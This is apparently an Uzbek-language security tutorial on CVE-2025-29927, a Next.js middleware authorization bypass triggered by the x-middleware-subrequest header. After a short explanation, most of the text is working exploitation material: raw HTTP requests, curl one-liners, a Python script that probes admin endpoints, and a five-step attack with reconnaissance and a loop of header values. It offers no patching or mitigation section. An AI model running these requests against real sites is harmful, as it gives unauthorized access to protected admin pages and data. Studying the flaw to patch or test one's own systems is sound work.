# ⚡ Next.js: CVE-2025-29927 (Avtorizatsiya Bypass)

> **Maqsad:** Next.js middleware dagi kritik zaiflikni o'rganish — autentifikatsiyani chetlab o'tish.

---

## 📖 CVE-2025-29927 nima?

**CVE-2025-29927** — Next.js framework ning middleware (oraliq dastur) qismidagi kritik zaiflik. Maxsus HTTP header yordamida middleware ni o'tkazib yuborish va himoyalangan sahifalarga ruxsatsiz kirish mumkin.

```
CVSS Ball: 9.1 (Kritik)
Ta'sirlangan: Next.js < 15.2.3, < 14.2.25, < 13.5.9, < 12.3.5
Zaiflik turi: Authorization Bypass (Avtorizatsiya Chetlab O'tish)
```

---

## 🔍 Zaiflik Qanday Ishlaydi?

### Normal jarayon:
```
Foydalanuvchi → Middleware (autentifikatsiya tekshirish) → Sahifa
               ↑ Agar tekshiruvdan o'tmasa → /login ga redirect
```

### Zaiflik bilan:
```
Foydalanuvchi + x-middleware-subrequest header → Middleware O'TKAZIB YUBORILADI → Sahifa
```

### Texnik tushuntirish:
```javascript
// Next.js middleware ichida:
// Middleware o'zini-o'zi chaqirganda bu headerni ishlatadi
// x-middleware-subrequest: middleware-name

// Hujumchi bu headerni yuborsa:
// Next.js "Bu ichki so'rov" deb o'ylaydi
// Va middleware ni bajarmasdan o'tadi!
```

## 🎯 Hujum

### Oddiy so'rov (middleware ishlaydi):
```http
GET /admin HTTP/1.1
Host: target.com

# Javob: 302 → /login (redirect)
```

### Hujum so'rovi (middleware o'tkazib yuboriladi):
```http
GET /admin HTTP/1.1
Host: target.com
x-middleware-subrequest: middleware

# Javob: 200 OK — Admin sahifasi!
```

## 🛠️ Ekspluatatsiya (Foydalanish)

### curl bilan:
```bash
# Oddiy so'rov — redirect bo'ladi:
curl -v http://target.com/admin
# < HTTP/1.1 302 Found
# < Location: /login

# Zaiflik bilan — to'g'ri kirish:
curl -v http://target.com/admin \
  -H "x-middleware-subrequest: middleware"
# < HTTP/1.1 200 OK
# Admin sahifasi!

# Turli header qiymatlari sinab ko'ring:
curl http://target.com/admin -H "x-middleware-subrequest: pages/middleware"
curl http://target.com/admin -H "x-middleware-subrequest: src/middleware"
curl http://target.com/admin -H "x-middleware-subrequest: middleware:middleware"
```

### Burp Suite bilan:
```http
GET /admin HTTP/1.1
Host: target.com
x-middleware-subrequest: middleware

# Repeater da yuboring → 200 javob → Admin!
```

### Python bilan:
```python
import requests

target = "http://target.com"
headers = {
    "x-middleware-subrequest": "middleware"
}

# Himoyalangan sahifalarni tekshirish:
endpoints = ["/admin", "/dashboard", "/api/admin", "/profile"]

for endpoint in endpoints:
    r = requests.get(target + endpoint, headers=headers)
    print(f"{endpoint}: {r.status_code}")
    if r.status_code == 200:
        print(f"[+] BYPASS! {endpoint} ga kirish mumkin!")
```

## 🎯 Amaliy Misol: To'liq Hujum

```bash
# 1-qadam: Next.js ekanligini aniqlash
curl -I http://target.com
# yoki: /_next/ ga kirish

# 2-qadam: Versiyani aniqlash
curl http://target.com/package.json 2>/dev/null | grep next

# 3-qadam: Himoyalangan sahifalarni topish
# robots.txt, gobuster, manba kodi orqali

# 4-qadam: Bypass sinash
curl http://target.com/admin \
  -H "x-middleware-subrequest: middleware" -v

# 5-qadam: Turli qiymatlar sinash
for val in "middleware" "pages/middleware" "src/middleware" \
           "app/middleware" "middleware:middleware"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
           http://target.com/admin \
           -H "x-middleware-subrequest: $val")
    echo "$val: $code"
done
```
